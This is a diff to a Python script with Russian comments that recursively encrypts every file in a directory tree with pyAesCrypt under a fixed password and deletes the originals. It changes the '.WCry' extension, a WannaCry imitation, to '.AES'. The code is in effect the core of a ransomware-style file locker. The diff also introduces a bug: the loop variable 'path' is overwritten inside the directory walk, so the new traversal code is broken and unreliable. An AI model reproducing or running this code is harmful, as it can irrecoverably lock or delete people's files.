@@ -10,17 +10,17 @@ BUFFER_SIZE = 512 * 1024
 
 
 def crypt_file(file):
-    if str(file[len(str(file))-5:]) == '.WCry':     # пропускаем уже зашифрованные файлы
+    if file.endswith('.AES'):     # пропускаем уже зашифрованные файлы
         pass
     else:
-        pyAesCrypt.encryptFile(str(file), str(file) + '.WCry', PASSWORD, BUFFER_SIZE)
+        pyAesCrypt.encryptFile(str(file), str(file) + '.AES', PASSWORD, BUFFER_SIZE)
         print('file ' + file + ' encrypted')
         os.remove(file)
 
 
-def crypt_dir(dir):
-    for file in os.listdir(dir):
-        path = os.path.join(dir, file)
+def crypt_dir(path):
+    for file in os.listdir(path):
+        path = os.path.join(path, file)
         if os.path.isfile(path):
             crypt_file(path)
         else:
@@ -28,17 +28,18 @@ def crypt_dir(dir):
 
 
 def decrypt_file(file):
-    if str(file[len(str(file))-5:]) == '.WCry':     # расшифровываем только зашифрованные файлы
-        pyAesCrypt.decryptFile(str(file), str(file[0:-5]), PASSWORD, BUFFER_SIZE)
+    filename, file_extension = os.path.splitext(file)
+    if file_extension == '.AES':     # расшифровываем только зашифрованные файлы
+        pyAesCrypt.decryptFile(str(file), filename, PASSWORD, BUFFER_SIZE)
         print('file ' + file + ' decrypted')
         os.remove(file)
     else:
         pass
 
 
-def decrypt_dir(dir):
-    for file in os.listdir(dir):
-        path = os.path.join(dir, file)
+def decrypt_dir(path):
+    for file in os.listdir(path):
+        path = os.path.join(path, file)
         if os.path.isfile(path):
             decrypt_file(path)
         else:
